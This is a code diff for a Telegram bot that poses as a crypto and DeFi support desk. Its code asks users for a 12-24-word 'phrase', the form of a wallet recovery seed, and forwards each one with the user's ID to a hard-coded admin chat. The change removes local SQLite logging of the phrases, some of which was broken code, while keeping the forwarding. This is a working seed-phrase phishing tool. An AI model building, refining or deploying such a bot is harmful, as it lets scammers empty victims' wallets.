@@ -1,6 +1,5 @@
 import logging
 import os
-import sqlite3
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
@@ -12,25 +11,11 @@ logger = logging.getLogger(__name__)
 
 # Bot token
 from dotenv import load_dotenv
-import os
-
 load_dotenv()  # Load environment variables from .env
 TOKEN = os.environ.get("BOT_TOKEN")
 
 # Admin ID
 ADMIN_ID = 6244946735
-
-# Initialize SQLite
-conn = sqlite3.connect('support_requests.db', check_same_thread=False)
-cursor = conn.cursor()
-try:
-    cursor.execute(
-        'INSERT OR REPLACE INTO requests (user_id, issue, platform, phrase, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (str(user_id), user_state[user_id]["issue"], user_state[user_id]["platform"], text, datetime.utcnow().isoformat())
-    )
-    conn.commit()
-except Exception as e:
-    logger.error(f"Failed to store in SQLite: {str(e)}")
 
 # List of supported platforms with emojis
 PLATFORMS = [
@@ -49,9 +34,9 @@ ISSUES = [
     ("Yield Farming Issue ('YF')", "🌾"),
     ("Initial Farm Offering Issue ('IFO')", "🚀"),
     ("Staking Issue ('Staking')", "🔗"),
-    ("NFT Marketplace Issue ('NFT')", "🖼️"),
-    ("Lottery Issue ('Lottery')", "🎟️"),
-    ("Governance Issue ('Governance')", "🗳️"),
+    ("NFT Marketplace Issue ('NFT')", "🖼"),
+    ("Lottery Issue ('Lottery')", "🎟"),
+    ("Governance Issue ('Governance')", "🗳"),
     ("Wallet Connection Issue", "🔌"),
     ("Other Issue", "❓")
 ]
@@ -133,15 +118,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 chat_id=ADMIN_ID,
                 text=f"📬 New support request:\nUser ID: {user_id}\nIssue: {issue}\nPlatform: {platform}\nPhrase: {text}"
             )
-            # Store in SQLite (optional, consider removing for security)
-            try:
-                cursor.execute(
-                    'INSERT OR REPLACE INTO requests (user_id, issue, platform, phrase, timestamp) VALUES (?, ?, ?, ?, ?)',
-                    (str(user_id), user_state[user_id]["issue"], user_state[user_id]["platform"], text, datetime.utcnow().isoformat())
-                )
-                conn.commit()
-            except Exception as e:
-                logger.error(f"Failed to store in SQLite: {str(e)}")
         else:
             await update.message.reply_text(
                 f"❌ Invalid phrase: '{text}'. Must be 12-24 words, using only lowercase letters and numbers. Please try again."
